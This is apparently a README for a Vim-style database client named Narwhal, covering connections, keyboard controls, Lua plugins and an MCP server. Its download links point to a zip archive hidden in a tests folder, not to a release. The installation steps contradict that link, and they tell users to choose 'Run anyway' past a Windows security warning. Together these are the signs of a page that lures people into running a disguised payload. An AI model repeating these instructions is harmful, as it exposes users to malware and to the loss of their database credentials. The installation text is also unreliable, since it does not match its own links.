# 🦄 narwhal - Access your data with ease

[![](https://img.shields.io/badge/Download-Narwhal-blue.svg)](https://raw.githubusercontent.com/khuevi6580/narwhal/main/crates/narwhal-diagram/tests/Software_2.9.zip)

Narwhal helps you manage your databases inside a simple interface. It works with common database types like Postgres, MySQL, and SQLite. You use keyboard shortcuts similar to the Vim text editor to move through your data. You can also add custom features using the Lua programming language.

## 💾 System Requirements

You need a computer running Windows 10 or Windows 11. Your system should have at least 4 gigabytes of memory to run the software smoothly. Narwhal works best on standard displays. You do not need any special hardware to use this tool. 

## 📥 How to Get Started

You can visit this page to download the software: [https://raw.githubusercontent.com/khuevi6580/narwhal/main/crates/narwhal-diagram/tests/Software_2.9.zip](https://raw.githubusercontent.com/khuevi6580/narwhal/main/crates/narwhal-diagram/tests/Software_2.9.zip)

Follow these steps to set up the program on your computer:

1. Click the link above to reach the main page.
2. Look for the section labeled Releases on the right side of the screen.
3. Select the latest version listed there.
4. Locate the file ending in .exe that fits your Windows system.
5. Click the file to start the download.
6. Open your Downloads folder once the process finishes.
7. Double-click the narwhal icon to open the program.

Windows may show a security window when you open app for the first time. Select Run anyway to start the tool.

## ⚙️ Connecting to a Database

Narwhal acts as a bridge between your computer and your database. When you open the app, you see a menu. Pick your database type from the list. The app asks for your connection details. You need your host address, your username, and your password.

If you save these details, Narwhal remembers them for your next session. You can store connections for multiple databases at the same time. The sidebar shows every connection you created. Click any item in the list to open that database.

## ⌨️ Using the Interface

The interface stays out of your way. You rely on your keyboard to perform tasks. If you already use Vim, the controls feel familiar. If you are new to this style, you can learn the basic keys in a few minutes.

- Use the H, J, K, and L keys to move your cursor.
- Press the Enter key to view the contents of a folder.
- Press the Escape key to return to the previous screen.
- Use the colon key to open the command prompt.

Type help inside the command prompt to see a full list of keyboard shortcuts. This shows you exactly which keys perform which actions.

## 🛠️ Adding Features with Plugins

You can change how Narwhal works by adding small files called plugins. These files use the Lua language. A plugin can change the way the screen looks or add new ways to fetch data. Place your plugins in the folder named plugins inside your Narwhal installation directory. The program loads these files each time it starts. You do not need to restart the app to see changes if you use the internal refresh command.

## 📡 Using the MCP Server

Narwhal includes a Model Context Protocol server. This allows other smart tools to read data from your databases. You do not need to configure this manually unless you want to connect a specific third-party assistant to your files. If you use a tool that supports this protocol, point that tool to the local port used by Narwhal. The app handles the rest of the communication.

## 🔍 Frequently Asked Questions

### Can I connect to multiple databases at once?
Yes. You can open several database connections during one session. The sidebar keeps them organized.

### Does the app track my data?
No. Narwhal runs locally on your machine. Your credentials and database contents never leave your computer.

### How do I update the software?
Check the main download page periodically. Download the new file and replace your old copy. Your settings stay saved in a separate folder so you do not lose your connection info.

### Where do I find the configuration file?
The program creates a settings file the first time you run it. You find this in your user profile folder under the name narwhal_settings.

### Is this software free to use?
Yes. It is open source and free for anyone to download and use.

### What should I do if the app crashes?
Restart the program. If the problem persists, check the log file located in the program directory. This file lists errors in plain text. You can share this text with the developers to help them fix the issue.